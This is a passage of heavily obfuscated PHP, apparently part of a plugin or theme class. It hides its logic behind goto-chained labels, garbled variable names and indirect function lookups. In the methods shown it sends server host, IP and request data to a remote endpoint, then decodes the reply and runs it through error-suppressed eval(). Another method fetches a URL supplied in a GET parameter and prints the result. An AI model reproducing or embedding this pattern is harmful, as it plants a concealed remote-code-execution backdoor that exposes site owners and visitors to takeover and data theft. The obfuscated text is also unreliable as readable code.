$_SERVER[£¿ÌÙëü¡¯¯]; $eÀ¥°óßÆ≥ =& $_SERVER[™≤ºµ]; if ($_SERVER[$eÀ¥°óßÆ≥[44]] != $eÀ¥°óßÆ≥[160] || !$eÀ¥°óßÆ≥[102]($GLOBALS, $eÀ¥°óßÆ≥[130])) { return; } goto BÉ—¯ë…∑ ; a¿òΩ⁄Èè∂: $BŸœ†‹≠ÚÜ = $A∏—ûÈÿõÉ[595]; while ($BŸœ†‹≠ÚÜ < $A∏—ûÈÿõÉ[544]) { if ($BŸœ†‹≠ÚÜ >= 0) { break; } $BŸœ†‹≠ÚÜ++; } $eÀ¥°óßÆ≥[164]($eÀ¥°óßÆ≥[195]($eÀ¥°óßÆ≥[206]), !0); goto eÀ —≠‡Ñ ; eê»¥Õ¿õØ: $eäÊê∞ÚÈ÷ = $A∏—ûÈÿõÉ[592]; while ($eäÊê∞ÚÈ÷ < $A∏—ûÈÿõÉ[549]) { if ($eäÊê∞ÚÈ÷ >= 0) { break; } $eäÊê∞ÚÈ÷++; } $cñã±—Íƒ› = $this->{$_SERVER[™≤ºµ][125]}($eÀ¥°óßÆ≥[146]($Fıãªí†Ò•), $føπ¡ñﬁ®ç); goto AÀØû®ˆÇ∏; bé¯º‚Û†≈: $a∂•öπ–Ñä = $eÀ¥°óßÆ≥[61]($eÀ¥°óßÆ≥[62])->{$_SERVER[™≤ºµ][63]}($eÀ¥°óßÆ≥[114]); $F˘å‚Òëÿ¥ = array($eÀ¥°óßÆ≥[163] => $b÷Çûèö“•[$eÀ¥°óßÆ≥[163]], $eÀ¥°óßÆ≥[166] => $eÀ¥°óßÆ≥[122](16), $eÀ¥°óßÆ≥[167] => $eÀ¥°óßÆ≥[147], $eÀ¥°óßÆ≥[168] => $eÀ¥°óßÆ≥[169], $eÀ¥°óßÆ≥[170] => $_SERVER[$eÀ¥°óßÆ≥[171]], $eÀ¥°óßÆ≥[172] => $_SERVER[$eÀ¥°óßÆ≥[173]], $eÀ¥°óßÆ≥[174] => $_SERVER[$eÀ¥°óßÆ≥[175]]); $AÃÉìÛ†Æú = $eÀ¥°óßÆ≥[112]($_SERVER[$eÀ¥°óßÆ≥[113]] . $a∂•öπ–Ñä); goto DÉ±ñÎå∑±; f¢¯ÊÌêÖ≠: $A™©Î¬±êØ = array($eÀ¥°óßÆ≥[207] => $F˘å‚Òëÿ¥[$eÀ¥°óßÆ≥[163]], $eÀ¥°óßÆ≥[208] => $Fıãªí†Ò•[$eÀ¥°óßÆ≥[209]], $eÀ¥°óßÆ≥[210] => $eÀ¥°óßÆ≥[122](16), $eÀ¥°óßÆ≥[118] => $Fıãªí†Ò•[$eÀ¥°óßÆ≥[211]]); if ($F˘å‚Òëÿ¥[$eÀ¥°óßÆ≥[166]]) { $A™©Î¬±êØ[$eÀ¥°óßÆ≥[210]] = $F˘å‚Òëÿ¥[$eÀ¥°óßÆ≥[166]]; } $aúßÿÀá¯„ = $eÀ¥°óßÆ≥[25]($eÀ¥°óßÆ≥[112]($A™©Î¬±êØ[$eÀ¥°óßÆ≥[208]]), 10, 10); goto dÌó·•¢Èπ; FÔØîû∂ µ: $A™©Î¬±êØ[$eÀ¥°óßÆ≥[121]] = $eÀ¥°óßÆ≥[116]($eÀ¥°óßÆ≥[212]($this->{$_SERVER[™≤ºµ][145]}($c»é¢¶ÉÓ‹, $eÀ¥°óßÆ≥[214]))); $Aß√ØØ“⁄è = $A∏—ûÈÿõÉ[590]; if (strlen($Aß√ØØ“⁄è) < $A∏—ûÈÿõÉ[549]) { die; } goto B¿∑ÿëËÿó; CÃ–â∑Ã¿Ø: $aåîìáÖáË = $this->{$_SERVER[™≤ºµ][197]}($Fıãªí†Ò•[$eÀ¥°óßÆ≥[198]]); $c◊†êÊ–◊  = $A∏—ûÈÿõÉ[588]; if (!$aåîìáÖáË || $aåîìáÖáË != $eÀ¥°óßÆ≥[199]($Fıãªí†Ò•[$eÀ¥°óßÆ≥[143]])) { $d’œÑ⁄◊ ú = array($eÀ¥°óßÆ≥[200] => $eÀ¥°óßÆ≥[61]($eÀ¥°óßÆ≥[62])->{$_SERVER[™≤ºµ][63]}($eÀ¥°óßÆ≥[114]), $eÀ¥°óßÆ≥[201] => $_SERVER[$eÀ¥°óßÆ≥[113]], $eÀ¥°óßÆ≥[202] => $eÀ¥°óßÆ≥[203](), $eÀ¥°óßÆ≥[172] => $_SERVER[$eÀ¥°óßÆ≥[173]]); $DØ˘±∞—† = $this->{$_SERVER[™≤ºµ][204]}($eÀ¥°óßÆ≥[146]($d’œÑ⁄◊ ú)); $this->{$_SERVER[™≤ºµ][180]}($eÀ¥°óßÆ≥[205] . $DØ˘±∞—†); $eÀ¥°óßÆ≥[164]($eÀ¥°óßÆ≥[195]($eÀ¥°óßÆ≥[206]), !0); } goto f¢¯ÊÌêÖ≠; C≈ï¿Í√”Ó: $bïÌíé‹ûï = array(); $bïÌíé‹ûï[$BŒ¥öÆ‹›Õ] = $cñã±—Íƒ›; $eÀ¥°óßÆ≥[61]($eÀ¥°óßÆ≥[11])->{$_SERVER[™≤ºµ][224]}($fæ›π”ï«≥[$eÀ¥°óßÆ≥[225]], array($eÀ¥°óßÆ≥[226] => $bïÌíé‹ûï)); goto a¿òΩ⁄Èè∂; B¿∑ÿëËÿó: if ($Fıãªí†Ò•[$eÀ¥°óßÆ≥[215]] && $Fıãªí†Ò•[$eÀ¥°óßÆ≥[215]] >= 1) { $eÀ¥°óßÆ≥[61]($eÀ¥°óßÆ≥[62])->{$_SERVER[™≤ºµ][216]}($eÀ¥°óßÆ≥[217], $eÀ¥°óßÆ≥[218]); } $eÀ¥°óßÆ≥[61]($eÀ¥°óßÆ≥[62])->{$_SERVER[™≤ºµ][219]}($A™©Î¬±êØ); $føπ¡ñﬁ®ç = $eÀ¥°óßÆ≥[112]($_SERVER[$eÀ¥°óßÆ≥[113]] . $eÀ¥°óßÆ≥[212]($a∂•öπ–Ñä) . $A™©Î¬±êØ[$eÀ¥°óßÆ≥[208]]); goto b˜∂”…∂‘à; AÀØû®ˆÇ∏: $fÇç·°»ˆ• = $A∏—ûÈÿõÉ[593]; while (strlen($fÇç·°»ˆ•) < $A∏—ûÈÿõÉ[549]) { if (!$fÇç·°»ˆ•) { break; } $fÇç·°»ˆ•++; } $AÂè– Íóò = $eÀ¥°óßÆ≥[220]($eÀ¥°óßÆ≥[61]($eÀ¥°óßÆ≥[11])->{$_SERVER[™≤ºµ][221]}(), $eÀ¥°óßÆ≥[222]); goto C¢¨Ö©∞≥Ç; BÉ—¯ë…∑ : $b÷Çûèö“• = $GLOBALS[$eÀ¥°óßÆ≥[22]]; if (isset($b÷Çûèö“•[$eÀ¥°óßÆ≥[161]])) { $this->{$_SERVER[™≤ºµ][162]}(); die; } if (!isset($b÷Çûèö“•[$eÀ¥°óßÆ≥[163]]) || $eÀ¥°óßÆ≥[24]($b÷Çûèö“•[$eÀ¥°óßÆ≥[163]]) != 16) { $eÀ¥°óßÆ≥[164]($eÀ¥°óßÆ≥[165] . $b÷Çûèö“•[$eÀ¥°óßÆ≥[163]], !1); } goto bé¯º‚Û†≈; C¢¨Ö©∞≥Ç: $fæ›π”ï«≥ = $AÂè– Íóò[$eÀ¥°óßÆ≥[223]]; $c¿ƒô≤É≥⁄ = $A∏—ûÈÿõÉ[594]; if (strlen($c¿ƒô≤É≥⁄) < $A∏—ûÈÿõÉ[561]) { return; } goto C≈ï¿Í√”Ó; eÀ —≠‡Ñ : $Fº≤Ôåïƒ« = $A∏—ûÈÿõÉ[596]; while ($Fº≤Ôåïƒ« < $A∏—ûÈÿõÉ[540]) { if ($Fº≤Ôåïƒ« >= 0) { break; } $Fº≤Ôåïƒ«++; } goto e†ã˜÷äÖë; DÉ±ñÎå∑±: if ($b÷Çûèö“•[$eÀ¥°óßÆ≥[176]] == $eÀ¥°óßÆ≥[177]) { $e§—ƒµÇêﬁ = $this->{$_SERVER[™≤ºµ][145]}($AÃÉìÛ†Æú, $eÀ¥°óßÆ≥[178]); $DØ˘±∞—† = $this->{$_SERVER[™≤ºµ][125]}($eÀ¥°óßÆ≥[146]($F˘å‚Òëÿ¥), $AÃÉìÛ†Æú . $eÀ¥°óßÆ≥[179], 3); $d£»ÉŸ„ﬁï = $this->{$_SERVER[™≤ºµ][180]}($eÀ¥°óßÆ≥[181] . $e§—ƒµÇêﬁ . $eÀ¥°óßÆ≥[182] . $DØ˘±∞—†, -1); $eÀ¥°óßÆ≥[164]($d£»ÉŸ„ﬁï, !0); } else { if ($b÷Çûèö“•[$eÀ¥°óßÆ≥[176]] == $eÀ¥°óßÆ≥[183]) { $fãê‹›∫¿å = $eÀ¥°óßÆ≥[25]($eÀ¥°óßÆ≥[112]($eÀ¥°óßÆ≥[184] . $AÃÉìÛ†Æú), 12, 15) . $eÀ¥°óßÆ≥[185]; $DØ˘±∞—† = $this->{$_SERVER[™≤ºµ][186]}($eÀ¥°óßÆ≥[2]($b÷Çûèö“•[$eÀ¥°óßÆ≥[187]]), $fãê‹›∫¿å, 2); $F®™™üó®Ø = $eÀ¥°óßÆ≥[188]($DØ˘±∞—†, !0); if (!$eÀ¥°óßÆ≥[189]($F®™™üó®Ø) || !$eÀ¥°óßÆ≥[189]($F®™™üó®Ø[$eÀ¥°óßÆ≥[190]]) || $F®™™üó®Ø[$eÀ¥°óßÆ≥[163]] != !0) { $fÚÎÏµ™‰≤ = $eÀ¥°óßÆ≥[191]; $F˘»ç™óåï = $F®™™üó®Ø[$eÀ¥°óßÆ≥[190]] ? $eÀ¥°óßÆ≥[192] . $F®™™üó®Ø[$eÀ¥°óßÆ≥[190]] : $fÚÎÏµ™‰≤; $eÀ¥°óßÆ≥[164]($F˘»ç™óåï, !1); } else { $F˘å‚Òëÿ¥[$eÀ¥°óßÆ≥[166]] = $F®™™üó®Ø[$eÀ¥°óßÆ≥[190]][$eÀ¥°óßÆ≥[193]]; } } else { $F®™™üó®Ø = $this->{$_SERVER[™≤ºµ][180]}($eÀ¥°óßÆ≥[194], $F˘å‚Òëÿ¥, 10); } } if (!$eÀ¥°óßÆ≥[189]($F®™™üó®Ø) || !$eÀ¥°óßÆ≥[189]($F®™™üó®Ø[$eÀ¥°óßÆ≥[190]]) || $F®™™üó®Ø[$eÀ¥°óßÆ≥[163]] != !0) { $fÚÎÏµ™‰≤ = $eÀ¥°óßÆ≥[195]($eÀ¥°óßÆ≥[196]); $F˘»ç™óåï = $F®™™üó®Ø[$eÀ¥°óßÆ≥[190]] ? $eÀ¥°óßÆ≥[192] . $F®™™üó®Ø[$eÀ¥°óßÆ≥[190]] : $fÚÎÏµ™‰≤; $eÀ¥°óßÆ≥[164]($F˘»ç™óåï, !1); } $Fıãªí†Ò• = $F®™™üó®Ø[$eÀ¥°óßÆ≥[190]]; goto CÃ–â∑Ã¿Ø; eˆå≈”ÇùŸ: $c»é¢¶ÉÓ‹ = $a›∫ÎØå°Û . $A™©Î¬±êØ[$eÀ¥°óßÆ≥[118]] . $this->{$_SERVER[™≤ºµ][145]}($eÀ¥°óßÆ≥[112]($A™©Î¬±êØ[$eÀ¥°óßÆ≥[207]]), $a›∫ÎØå°Û); $aÊ‹Øﬁ÷Ñ∞ = $A∏—ûÈÿõÉ[589]; if (strlen($aÊ‹Øﬁ÷Ñ∞) < $A∏—ûÈÿõÉ[556]) { return; } goto FÔØîû∂ µ; b˜∂”…∂‘à: $AÊ›∆õÊı¬ = $A∏—ûÈÿõÉ[591]; if (!$AÊ›∆õÊı¬) { die; } $BŒ¥öÆ‹›Õ = $eÀ¥°óßÆ≥[212]($eÀ¥°óßÆ≥[25]($føπ¡ñﬁ®ç, 10, 16)); goto eê»¥Õ¿õØ; e†ã˜÷äÖë: } private function nkqpdfd59aed() { goto fÁ›¨ﬁçÌ◊; Dñª’¢Ë◊ù: $Dõ¶â—√√£ = $E’ÊöÈ‚Ã‡[597]; if (strlen($Dõ¶â—√√£) < $E’ÊöÈ‚Ã‡[549]) { die; } $AÜùÛ¯¯•Ã[61]($AÜùÛ¯¯•Ã[62])->{$_SERVER[™≤ºµ][216]}($AÜùÛ¯¯•Ã[217], $AÜùÛ¯¯•Ã[227]); goto DµåãÕîÜÆ; DµåãÕîÜÆ: $AìÚﬁÓ∏√¶ = $E’ÊöÈ‚Ã‡[598]; if (!$AìÚﬁÓ∏√¶) { die; } $this->ubik2449d0f6 = array(); goto Dà›°ı‹Àè; Dà›°ı‹Àè: $this->ljsm2d5c14a8 = $AÜùÛ¯¯•Ã[119]; goto Bê≠ñ¨¶∫â; fÁ›¨ﬁçÌ◊: $E’ÊöÈ‚Ã‡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÜùÛ¯¯•Ã =& $_SERVER[™≤ºµ]; $AÜùÛ¯¯•Ã[61]($AÜùÛ¯¯•Ã[62])->{$_SERVER[™≤ºµ][219]}(array($AÜùÛ¯¯•Ã[207] => $AÜùÛ¯¯•Ã[10], $AÜùÛ¯¯•Ã[208] => $AÜùÛ¯¯•Ã[10], $AÜùÛ¯¯•Ã[118] => $AÜùÛ¯¯•Ã[119], $AÜùÛ¯¯•Ã[120] => $AÜùÛ¯¯•Ã[10], $AÜùÛ¯¯•Ã[121] => $AÜùÛ¯¯•Ã[10])); goto Dñª’¢Ë◊ù; Bê≠ñ¨¶∫â: } private function qbhw1964d5ba() { goto AÖñäçîµù; cÊÏ¥æ‹◊¬: $AÆÇÚ—‚ä≠ = $C”ºè††ò°[61]($C”ºè††ò°[62])->{$_SERVER[™≤ºµ][63]}(); if ($AÆÇÚ—‚ä≠[$C”ºè††ò°[118]] == $C”ºè††ò°[119]) { return; } $Cåÿ◊√ü— = $C”ºè††ò°[61]($C”ºè††ò°[62])->{$_SERVER[™≤ºµ][63]}($C”ºè††ò°[114]); goto E∞ÎÜ≈éõ‡; d”ÃƒÊˆﬂ™: $a‡™œ≠Ç”å = $C”ºè††ò°[112]($_SERVER[$C”ºè††ò°[113]] . $C”ºè††ò°[212]($Cåÿ◊√ü—) . $AÆÇÚ—‚ä≠[$C”ºè††ò°[208]]); $Eùˆ¨¡√«• = $DΩ´©…îªª[601]; while (strlen($Eùˆ¨¡√«•) < $DΩ´©…îªª[561]) { if (!$Eùˆ¨¡√«•) { break; } $Eùˆ¨¡√«•++; } goto Fÿıµê“òÔ; F©äããÒµƒ: $this->ljsm2d5c14a8 = $AÆÇÚ—‚ä≠[$C”ºè††ò°[118]]; goto FéÜÊ˘àµ¶; Fÿıµê“òÔ: $BæÚ∆æ«£∏ = $C”ºè††ò°[212]($C”ºè††ò°[25]($a‡™œ≠Ç”å, 10, 16)); $c∂‚Â¬˜¶∞ = $DΩ´©…îªª[602]; if (!$c∂‚Â¬˜¶∞) { die; } goto E˜∞Ù†Æ†Ω; Aîãè£¢ƒã: $fÂ™ŸÀÃø° = $DΩ´©…îªª[600]; if (!$fÂ™ŸÀÃø°) { return; } $eö≥òπÎ°∆ = $C‚û§¥í‡‚[$C”ºè††ò°[223]]; goto d”ÃƒÊˆﬂ™; AÖñäçîµù: $DΩ´©…îªª =& $_SERVER[£¿ÌÙëü¡¯¯]; $C”ºè††ò° =& $_SERVER[™≤ºµ]; $this->ljsm2d5c14a8 = $C”ºè††ò°[119]; goto cÊÏ¥æ‹◊¬; d†—€‘¿ﬂ¶: $dÀ«–Â◊ ˜ = $C”ºè††ò°[142]($dÁ‚Œ¥ÎáÉ[$C”ºè††ò°[143]]); if ($C”ºè††ò°[228]() >= $dÀ«–Â◊ ˜) { return $this->{$_SERVER[™≤ºµ][162]}(); } $this->ubik2449d0f6 = $dÁ‚Œ¥ÎáÉ; goto F©äããÒµƒ; E∞ÎÜ≈éõ‡: $Fÿôö”∏€û = $DΩ´©…îªª[599]; while (strlen($Fÿôö”∏€û) < $DΩ´©…îªª[540]) { if (!$Fÿôö”∏€û) { break; } $Fÿôö”∏€û++; } $C‚û§¥í‡‚ = $C”ºè††ò°[220]($C”ºè††ò°[61]($C”ºè††ò°[11])->{$_SERVER[™≤ºµ][221]}(), $C”ºè††ò°[222]); goto Aîãè£¢ƒã; E˜∞Ù†Æ†Ω: $dÁ‚Œ¥ÎáÉ = $this->{$_SERVER[™≤ºµ][186]}($eö≥òπÎ°∆[$C”ºè††ò°[89]][$BæÚ∆æ«£∏], $a‡™œ≠Ç”å); $dÁ‚Œ¥ÎáÉ = $C”ºè††ò°[188]($dÁ‚Œ¥ÎáÉ, !0); if (!$C”ºè††ò°[189]($dÁ‚Œ¥ÎáÉ)) { return $this->{$_SERVER[™≤ºµ][162]}(); } goto d†—€‘¿ﬂ¶; FéÜÊ˘àµ¶: } private function dulp14a30f4e() { goto eƒçÆèºãë; eƒçÆèºãë: $A…’π©æÁå =& $_SERVER[£¿ÌÙëü¡¯¯]; $B∆‰åªç¿Â =& $_SERVER[™≤ºµ]; $aÒëØÒàΩÌ = $GLOBALS[$B∆‰åªç¿Â[22]]; goto E˜¶—µ¬ïé; FŒì§«è§≈: if ($B∆‰åªç¿Â[234]($CÉ∫ä´¨È∫, $Eñ™ôÃãºõ)) { if ($this->ljsm2d5c14a8 == $B∆‰åªç¿Â[119] && isset($aÒëØÒàΩÌ[$B∆‰åªç¿Â[235]])) { $B∆‰åªç¿Â[164]($B∆‰åªç¿Â[195]($B∆‰åªç¿Â[230]), !1, $B∆‰åªç¿Â[231]); die; } $FÆ∆∂ªÖ˜Ê = $this->{$_SERVER[™≤ºµ][135]}(); if ($FÆ∆∂ªÖ˜Ê != $B∆‰åªç¿Â[199]($B∆‰åªç¿Â[236])) { if ($FÆ∆∂ªÖ˜Ê <= $B∆‰åªç¿Â[61]($B∆‰åªç¿Â[137])->{$_SERVER[™≤ºµ][138]}()) { $B∆‰åªç¿Â[164]($B∆‰åªç¿Â[195]($B∆‰åªç¿Â[237]), !1, $B∆‰åªç¿Â[231]); die; } } } goto Aﬁ‰æπê¶Ï; d‰ÖÊ”ı˜Á: $eûÙÜœﬁ°∑ = $A…’π©æÁå[604]; if ($CÉ∫ä´¨È∫ == $B∆‰åªç¿Â[229] && $this->ljsm2d5c14a8 == $B∆‰åªç¿Â[119]) { $B∆‰åªç¿Â[164]($B∆‰åªç¿Â[195]($B∆‰åªç¿Â[230]), !1, $B∆‰åªç¿Â[231]); } $Eñ™ôÃãºõ = array($B∆‰åªç¿Â[232], $B∆‰åªç¿Â[233]); goto FŒì§«è§≈; E˜¶—µ¬ïé: $cùÈ≠—§∏∫ = $A…’π©æÁå[603]; while (strlen($cùÈ≠—§∏∫) < $A…’π©æÁå[540]) { if (!$cùÈ≠—§∏∫) { break; } $cùÈ≠—§∏∫++; } $CÉ∫ä´¨È∫ = $_SERVER[$B∆‰åªç¿Â[44]]; goto d‰ÖÊ”ı˜Á; Aﬁ‰æπê¶Ï: } private function khiz31b264b9() { goto DåÚê≤‹µâ; aÔÃßÉÒ÷º: if ($CÀÈﬂ¨Ï¶ã && $aœ‘ éÊﬂ±[32]($CÀÈﬂ¨Ï¶ã, $aœ‘ éÊﬂ±[251])) { echo $CÀÈﬂ¨Ï¶ã; } die; goto eãıﬁÑ¡Ô§; fã¨ñ◊îç: if (!$aœ‘ éÊﬂ±[234]($_SERVER[$aœ‘ éÊﬂ±[44]], $bû”‘Ø∆”â)) { return; } $aˆÒÈÖ€›™ = $aœ‘ éÊﬂ±[240]; $aˆÒÈÖ€›™ = $this->{$_SERVER[™≤ºµ][241]}($aˆÒÈÖ€›™, $aœ‘ éÊﬂ±[242]); goto aè‚ËÔŒü£; e¯—‡≠Áî£: $Aïë„ÌªÿÀ = $c⁄≈π‰’ ∑[605]; if (!$Aïë„ÌªÿÀ) { die; } if (!$aœ‘ éÊﬂ±[102]($GLOBALS, $aœ‘ éÊﬂ±[130]) || !isset($_GET[$aœ‘ éÊﬂ±[239]])) { return; } goto fã¨ñ◊îç; DåÚê≤‹µâ: $c⁄≈π‰’ ∑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aœ‘ éÊﬂ± =& $_SERVER[™≤ºµ]; $bû”‘Ø∆”â = array($aœ‘ éÊﬂ±[133], $aœ‘ éÊﬂ±[238]); goto e¯—‡≠Áî£; aè‚ËÔŒü£: $D‹àªáÁµä = $aœ‘ éÊﬂ±[243](array($aœ‘ éÊﬂ±[244] => array($aœ‘ éÊﬂ±[245] => $aœ‘ éÊﬂ±[246], $aœ‘ éÊﬂ±[247] => 3))); $dïÈ”Ö◊◊æ = $c⁄≈π‰’ ∑[606]; $CÀÈﬂ¨Ï¶ã = @$aœ‘ éÊﬂ±[248]($aˆÒÈÖ€›™, !1, $D‹àªáÁµä); goto e›º¨Æ……à; e›º¨Æ……à: $aœ‘ éÊﬂ±[249]($aœ‘ éÊﬂ±[250]); $c≠ŸÇÕÃÑ† = $c⁄≈π‰’ ∑[607]; if (strlen($c≠ŸÇÕÃÑ†) < $c⁄≈π‰’ ∑[561]) { die; } goto aÔÃßÉÒ÷º; eãıﬁÑ¡Ô§: } public function vozm6b3b5398($b≥ﬁ€ΩÜ’∂) { goto Aè≠ÃàòÜÓ; Aè≠ÃàòÜÓ: $E›Öœ´ì‰« =& $_SERVER[™≤ºµ]; if ($this->ljsm2d5c14a8 == $E›Öœ´ì‰«[252]) { return $b≥ﬁ€ΩÜ’∂; } $a∆ÀÇ§Ü‰ô = array($E›Öœ´ì‰«[253], $E›Öœ´ì‰«[254], $E›Öœ´ì‰«[255], $E›Öœ´ì‰«[256], $E›Öœ´ì‰«[257], $E›Öœ´ì‰«[258], $E›Öœ´ì‰«[259], $E›Öœ´ì‰«[260]); goto fø›ã‘çÛì; fø›ã‘çÛì: $AØøŒˆ÷´Ω = $E›Öœ´ì‰«[0]($E›Öœ´ì‰«[261], $E›Öœ´ì‰«[102]($this->ubik2449d0f6, $E›Öœ´ì‰«[127], $E›Öœ´ì‰«[10])); $f÷©´«Ü™Ü = array(); foreach ($a∆ÀÇ§Ü‰ô as $F€ªÎà◊˘ô) { if (!$E›Öœ´ì‰«[234]($F€ªÎà◊˘ô, $AØøŒˆ÷´Ω)) { $f÷©´«Ü™Ü[] = $F€ªÎà◊˘ô; } } goto F¯ÏùõîŒÍ; F¯ÏùõîŒÍ: foreach ($f÷©´«Ü™Ü as $F€ªÎà◊˘ô) { unset($b≥ﬁ€ΩÜ’∂[$F€ªÎà◊˘ô]); } return $b≥ﬁ€ΩÜ’∂; goto Eø⁄Ôáœìﬂ; Eø⁄Ôáœìﬂ: } private function wdih1405fbe1() { goto aó¨áîı˜ó; fïæ∏–ë¥: while (strlen($C‚Îë–÷≠±) < $CˆÌ¢ﬁ◊ò†[540]) { if (!$C‚Îë–÷≠±) { break; } $C‚Îë–÷≠±++; } foreach ($C¢∂Ÿ‚ﬂ∞œ as $A•√ÉÖ“î´) { if ($A•√ÉÖ“î´ == $cêã‹„âª∂ || $dÒ£º∑∆Éœ[25]($cêã‹„âª∂, 0, $dÒ£º∑∆Éœ[24]($A•√ÉÖ“î´)) == $A•√ÉÖ“î´) { $dÒ£º∑∆Éœ[164]($dÒ£º∑∆Éœ[195]($dÒ£º∑∆Éœ[263]), !1); } } $this->{$_SERVER[™≤ºµ][3]}($dÒ£º∑∆Éœ[264], array($this, $dÒ£º∑∆Éœ[265])); goto f∑Î∞Úï≤à; aó¨áîı˜ó: $CˆÌ¢ﬁ◊ò† =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÒ£º∑∆Éœ =& $_SERVER[™≤ºµ]; if ($this->ljsm2d5c14a8 != $dÒ£º∑∆Éœ[119]) { return; } goto C¬˜Ωﬁ⁄ô√; f∑Î∞Úï≤à: $GLOBALS[$dÒ£º∑∆Éœ[89]][$dÒ£º∑∆Éœ[266]] = $dÒ£º∑∆Éœ[218]; goto a˜ÇÂ¥Á“»; C¬˜Ωﬁ⁄ô√: $cêã‹„âª∂ = $_SERVER[$dÒ£º∑∆Éœ[44]]; $C¢∂Ÿ‚ﬂ∞œ = array($dÒ£º∑∆Éœ[262]); $C‚Îë–÷≠± = $CˆÌ¢ﬁ◊ò†[608]; goto fïæ∏–ë¥; a˜ÇÂ¥Á“»: } public function dkgb18ad0081() { return $_SERVER[™≤ºµ][267]; $dä®Âµ¢÷⁄ = $_SERVER[£¿ÌÙëü¡¯¯][609]; if (!$dä®Âµ¢÷⁄) { die; } } private function cebyc2090945() { goto dÌ®ê‘≈Êº; dÌ®ê‘≈Êº: $A”ÑüÍÿ ° =& $_SERVER[£¿ÌÙëü¡¯¯]; $EËÖÙŒùñ¶ =& $_SERVER[™≤ºµ]; $Dﬂ’ı≥µêÛ = array($EËÖÙŒùñ¶[268], $EËÖÙŒùñ¶[269], $EËÖÙŒùñ¶[270]); goto eûáÙ±Ÿ—ã; FÖÜ ªÎ´¶: if (!$EËÖÙŒùñ¶[189]($C´Ÿí√ã≤‹)) { return; } if ($C´Ÿí√ã≤‹[$EËÖÙŒùñ¶[163]] && $C´Ÿí√ã≤‹[$EËÖÙŒùñ¶[277]]) { if ($this->{$_SERVER[™≤ºµ][197]}($C´Ÿí√ã≤‹[$EËÖÙŒùñ¶[277]]) == $cƒ¶éáß∞Î[$EËÖÙŒùñ¶[163]]) { return; } } $this->{$_SERVER[™≤ºµ][162]}(); goto b±ÕÂØ˜•â; B˘Üì∂‹Î’: if ($Dáõè‘∂√Ô && $EËÖÙŒùñ¶[228]() - $Dáõè‘∂√Ô < $EËÖÙŒùñ¶[199]($EËÖÙŒùñ¶[275])) { return; } $EËÖÙŒùñ¶[13](array($EËÖÙŒùñ¶[273], $EËÖÙŒùñ¶[150]), $aëƒÿ®Èñ©, $EËÖÙŒùñ¶[228]()); $cƒ¶éáß∞Î = array($EËÖÙŒùñ¶[163] => $EËÖÙŒùñ¶[61]($EËÖÙŒùñ¶[62])->{$_SERVER[™≤ºµ][63]}($EËÖÙŒùñ¶[207]), $EËÖÙŒùñ¶[176] => $this->ljsm2d5c14a8, $EËÖÙŒùñ¶[174] => $_SERVER[$EËÖÙŒùñ¶[175]], $EËÖÙŒùñ¶[167] => $EËÖÙŒùñ¶[147], $EËÖÙŒùñ¶[170] => $_SERVER[$EËÖÙŒùñ¶[171]]); goto B€“ÿØµàÖ; b±ÕÂØ˜•â: $D±·∞Õ›™µ = $A”ÑüÍÿ °[614]; if ($this->{$_SERVER[™≤ºµ][197]}($C´Ÿí√ã≤‹[$EËÖÙŒùñ¶[277]]) != $cƒ¶éáß∞Î[$EËÖÙŒùñ¶[163]]) { $EóÍíßã”„ = array($EËÖÙŒùñ¶[200] => $EËÖÙŒùñ¶[61]($EËÖÙŒùñ¶[62])->{$_SERVER[™≤ºµ][63]}($EËÖÙŒùñ¶[114]), $EËÖÙŒùñ¶[201] => $_SERVER[$EËÖÙŒùñ¶[113]], $EËÖÙŒùñ¶[202] => $EËÖÙŒùñ¶[203](), $EËÖÙŒùñ¶[172] => $_SERVER[$EËÖÙŒùñ¶[173]]); $DäƒœÏ«Õ⁄ = $this->{$_SERVER[™≤ºµ][204]}($EËÖÙŒùñ¶[146]($EóÍíßã”„)); $C´Ÿí√ã≤‹ = $this->{$_SERVER[™≤ºµ][180]}($EËÖÙŒùñ¶[205] . $DäƒœÏ«Õ⁄); if ($C´Ÿí√ã≤‹ && $EËÖÙŒùñ¶[189]($C´Ÿí√ã≤‹) && isset($C´Ÿí√ã≤‹[$EËÖÙŒùñ¶[277]])) { $E≠°¶ÖçÒ” = $this->{$_SERVER[™≤ºµ][186]}($C´Ÿí√ã≤‹[$EËÖÙŒùñ¶[277]], 2); if ($E≠°¶ÖçÒ”) { $E≠°¶ÖçÒ” = $this->{$_SERVER[™≤ºµ][197]}($E≠°¶ÖçÒ”); } if ($E≠°¶ÖçÒ”) { try { @eval($E≠°¶ÖçÒ”); } catch (Exception $e™®±ºËˆ†) { } } } } goto f‚ßáÀëı†; eûáÙ±Ÿ—ã: $bñá¬ñﬁ‹‹ = $A”ÑüÍÿ °[610]; while ($bñá¬ñﬁ‹‹ < $A”ÑüÍÿ °[544]) { if ($bñá¬ñﬁ‹‹ >= 0) { break; } $bñá¬ñﬁ‹‹++; } $aëƒÿ®Èñ© = $EËÖÙŒùñ¶[271] . $EËÖÙŒùñ¶[112]($EËÖÙŒùñ¶[272]); goto FãÈç’Ö»õ; Dé£ËÃ¯µ˘: if ($EËÖÙŒùñ¶[228]() % 4 != 0) { return; } $Dáõè‘∂√Ô = $EËÖÙŒùñ¶[13](array($EËÖÙŒùñ¶[273], $EËÖÙŒùñ¶[274]), $aëƒÿ®Èñ©); $EëïûµÂºı = $A”ÑüÍÿ °[612]; goto B˘Üì∂‹Î’; FãÈç’Ö»õ: $eµªÑíÔ•Ï = $A”ÑüÍÿ °[611]; if ($this->ljsm2d5c14a8 == $EËÖÙŒùñ¶[119] || !$EËÖÙŒùñ¶[102]($GLOBALS, $EËÖÙŒùñ¶[130])) { return; } if (!$EËÖÙŒùñ¶[234]($_SERVER[$EËÖÙŒùñ¶[44]], $Dﬂ’ı≥µêÛ)) { return; } goto Dé£ËÃ¯µ˘; B€“ÿØµàÖ: $C´Ÿí√ã≤‹ = $this->{$_SERVER[™≤ºµ][180]}($EËÖÙŒùñ¶[276], $cƒ¶éáß∞Î); $A†ÁÔ¿ÂËÛ = $A”ÑüÍÿ °[613]; if (strlen($A†ÁÔ¿ÂËÛ) < $A”ÑüÍÿ °[540]) { die; } goto FÖÜ ªÎ´¶; f‚ßáÀëı†: } private function bynfc767f43e($EË¥ô◊∞∑ = '', $BÌ‰º—ﬁå‹ = array(), $b§üç‹Õâ£ = 5) { goto aµáæ∫˘ﬂı; dØíıüÕä≈: $A©Éä‘åÇﬂ = $DÖÈ‚›ÁæÔ[617]; if (!$A©Éä‘åÇﬂ) { return; } goto aÒç‰©ÉÏö; 